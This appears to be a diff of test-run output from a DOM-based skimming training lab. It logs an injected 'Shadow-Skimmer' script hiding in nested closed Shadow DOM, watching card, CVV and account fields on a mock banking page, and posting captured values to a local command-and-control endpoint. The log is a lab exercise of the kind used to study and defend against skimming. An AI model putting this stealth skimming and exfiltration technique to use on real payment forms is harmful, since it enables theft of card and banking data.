+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869514220_8xs93 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869514221_3dquw 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_mdlfa5ni8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_wozqxhqle 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514656_p4uplquuh 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514657_t7ys7e2yh 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869514657_o8dyk2d4e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+  ✘  22 [chromium] › test/tests/lab2-improvements.spec.js:206:3 › Lab 2: DOM-Based Skimming - UI Improvements › should have fewer features and focus on cc-input page (6.9s)
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869514759_9hct9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869514760_ggysf 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869514760_0ma1l 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869514760_v0lfh 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869514760_4dg4p 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869514760_nxc3x 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869514761_7pmt4 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
+📝 Testing field monitoring through shadows...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869514220_1c25a 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869514221_9bei8","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869515718,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869515718,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1548}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869515769,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869514220_1c25a","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869515719,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869515719,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1556}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869515776,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_ltcdc0seg 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_4vrzy65rz 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_6k2mzr5y0 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515782_8kyt2az1l 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869515783_7f0ibz6ht 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869515884_j8v6a 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869515885_0xodz 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869515885_asxgn 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869515885_erplu 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869515885_0exjn 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869515885_k7wey 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869515885_wc5lr 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869515886_sbdjk 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869515886_qkthi 
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-2t8om9mj9hDAJk97pU7YlDmkEpY"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:35 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-T0/Dwu8o+ndok7FkQJ3jVZVYwYY"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869516223,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869516223,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1514}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516276,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869514759_fqswp","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869516224,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869516224,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1518}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516277,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-+gHV+4Cbxwxl/KMX93leeeqQohQ"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_add-card-form_no-name_no-type_1762869514761_4mbi9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_input_card-number_cardNumber_text_1762869514759_fqswp 
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-wBEKwcLgrzoZXWH4hT2Aipvhgvg"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: change for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: change for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: focus for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: input for shadow_form_transfer-form_no-name_no-type_1762869514221_i940e 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_transfer-form_no-name_no-type_1762869514221_i940e","elementInfo":{"tagName":"FORM","name":"transfer-form"},"capturedEvents":[{"timestamp":1762869516750,"eventType":"input","value":"checking"},{"timestamp":1762869516750,"eventType":"change","value":"checking"},{"timestamp":1762869516761,"eventType":"focus"},{"timestamp":1762869516764,"eventType":"input","value":"123456789","inputType":"insertText","data":"123456789"},{"timestamp":1762869516777,"eventType":"change","value":"123456789"},{"timestamp":1762869516778,"eventType":"blur","value":"123456789"},{"timestamp":1762869516779,"eventType":"focus"},{"timestamp":1762869516783,"eventType":"input","value":"2500.00","inputType":"insertText","data":"2500.00"}],"capturedValues":[{"timestamp":1762869516750,"value":"checking","eventType":"input"},{"timestamp":1762869516750,"value":"checking","eventType":"change"},{"timestamp":1762869516764,"value":"123456789","eventType":"input"},{"timestamp":1762869516777,"value":"123456789","eventType":"change"},{"timestamp":1762869516778,"value":"123456789","eventType":"blur"},{"timestamp":1762869516783,"value":"2500.00","eventType":"input"}],"capturedKeystrokes":[],"sessionDuration":2608}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869516829,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-nZX0XQIZYnz/FNnqaEAl2TVTkn8"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:36 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+🔍 Shadow access test results: {
+  shadowHostsFound: [33m0[39m,
+  accessibleShadowRoots: [33m0[39m,
+  closedShadowRoots: [33m199[39m
+}
+👻 Shadow hosts from attack: [33m5[39m
+✅ Closed shadow DOM infrastructure confirmed
+🕵️ Testing anti-detection stealth measures...
+  ✘  25 [chromium] › test/tests/shadow-skimmer.spec.js:166:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle closed shadow DOM stealth (4.4s)
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_8rq3ibrxv 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_lj6d32goa 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_rdwwf1rf6 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519415_nw0p3qs3z 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869519416_a96t2ye4r 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869519517_li0k3 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869519518_mziy3 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869519518_slxpo 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869519518_mh85g 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869519518_pcoxa 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869519518_xau6x 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
